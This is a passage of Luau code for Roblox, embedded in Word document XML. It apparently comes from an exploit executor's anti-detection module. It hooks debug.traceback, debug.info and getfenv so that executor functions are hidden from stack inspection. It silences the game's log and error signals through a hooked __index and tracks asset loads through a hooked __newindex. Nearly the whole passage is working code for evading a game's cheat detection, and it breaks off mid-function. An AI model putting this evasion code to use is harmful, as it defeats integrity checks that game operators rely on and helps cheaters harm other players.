        <w:tab/>
        <w:t>local line</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if p1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>line = str:sub(pos, p1 - 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>pos = p2 + 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>line = str:sub(pos)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>pos = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return line</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>OldDebugTraceback = shared.SafeHook(getrenv().debug.traceback, function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if checkcaller() then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldDebugTraceback()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Traceback = OldDebugTraceback()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local NewTraceback = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for Line in TracebackLines(Traceback) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not ValidTraceback(Line) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>continue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table.insert(NewTraceback, Line)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return table.concat(NewTraceback, "\n")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>OldDebugInfo = shared.SafeHook(getrenv().debug.info, function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local ToInspect, LevelOrInfo, _ThreadInfo = ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>checkcaller()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>or typeof(ToInspect) == "function"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>or typeof(ToInspect) == "thread"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>or not pcall(function(LevelOrInfo) -- Validate arguments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>OldDebugInfo(function() end, LevelOrInfo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end, LevelOrInfo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldDebugInfo(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local ReconstructedConstructedStack = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for Level = 2, 19997 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Function, Source, Line, Name, NumberOfArgs, Varargs = OldDebugInfo(Level, "fslna")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not Function or not Source or not Line or not Name then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>break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if isexecutorclosure(Function) and not shared.Hooking.IncludeInStackFunctions[Function] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>continue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table.insert(ReconstructedConstructedStack, {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>f = Function,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>s = Source,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>l = Line,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>n = Name,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>a = { NumberOfArgs, Varargs },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local InfoLevel = ReconstructedConstructedStack[ToInspect]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not InfoLevel then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- Max level is 19997 so this guarantees that it will return nothing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldDebugInfo(3e4, LevelOrInfo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local ReturnResult = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for idx, info in string.split(LevelOrInfo, "") do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Value = InfoLevel[info]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if typeof(Value) == "table" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for _, v in Value do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>table.insert(ReturnResult, v)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>continue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table.insert(ReturnResult, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return table.unpack(ReturnResult, 1, #ReturnResult)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>OldFenv = shared.SafeHook(getrenv().getfenv, function(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if checkcaller() then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldFenv(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local ToInspect = ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if ToInspect == 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return getrenv()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>elseif ToInspect == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldFenv(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Success, ResultingEnv = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if typeof(ToInspect) == "number" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldFenv(ToInspect + 3)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return OldFenv(ToInspect)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not Success then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldFenv(...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if typeof(ToInspect) == "function" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if typeof(ResultingEnv["getgenv"]) == "function" and isexecutorclosure(ResultingEnv["getgenv"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return getrenv()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return ResultingEnv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local ReconstructedConstructedStack = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for Level = 2, 19997 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local StackInfoSuccess, Data = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>Environement = OldFenv(Level + 3),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>Function = OldDebugInfo(Level + 3, "f"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not StackInfoSuccess or not Data then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>break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local Environement = Data.Environement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- local Function = Data.Function</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if typeof(Environement["getgenv"]) == "function" and isexecutorclosure(Environement["getgenv"]) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>Environement = getrenv()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table.insert(ReconstructedConstructedStack, Environement)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local InfoLevel = ReconstructedConstructedStack[ToInspect]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not InfoLevel then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- Max level is 19997 so this guarantees that it will return error</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldFenv(3e4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return InfoLevel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>-- Disable all blacklisted connections</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local BlacklistedSignals = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>game:GetService("LogService").MessageOut,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>game:GetService("ScriptContext").Error,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local DummySignals = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>for _, Signal in next, BlacklistedSignals do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for _, Connection in next, getconnections(Signal) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- dawg why does volcano return a thread for Connection.Function</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>(Connection.Function</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>and type(Connection.Function) == "function"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>and isexecutorclosure(Connection.Function)) or</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>Connection.Function == nil -- CoreScript connections return nil for Function</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>Connection:Disable()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local OldIndex</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>OldIndex = hookmetamethod(game, "__index", function(Self, Key)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if checkcaller() then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return OldIndex(Self, Key)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local Result = OldIndex(Self, Key)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>for _, BlacklistedSignal in next, BlacklistedSignals do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if Result == BlacklistedSignal then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not DummySignals[BlacklistedSignal] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>DummySignals[BlacklistedSignal] = Instance.new("BindableEvent").Event</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return DummySignals[BlacklistedSignal]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>return Result</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>local OldNewIndex</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:t>OldNewIndex = hookmetamethod(game, "__newindex", function(Self, Key, Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local AssetIndexes = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>["MeshID"] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>["TextureID"] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>["MeshId"] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>["TextureId"] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>["Image"] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>["SoundId"] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>["AnimationId"] = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if AssetIndexes[Key] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local AssetId = Value</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if typeof(AssetId) == "string" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>AssetId = tonumber(AssetId:match("%d+"))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if AssetId and not BlacklistedAssets[AssetId] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>-- Check if the asset is already loaded so we don't accidentally blacklist a legitimate asset</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>local AssetLoaded = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>ContentProvider:GetAssetFetchStatus("rbxassetid://" .. AssetId)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>== Enum.AssetFetchStatus.Success</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>AssetLoaded = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if checkcaller() then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>if not AssetLoaded then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>BlacklistedAssets[AssetId] = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
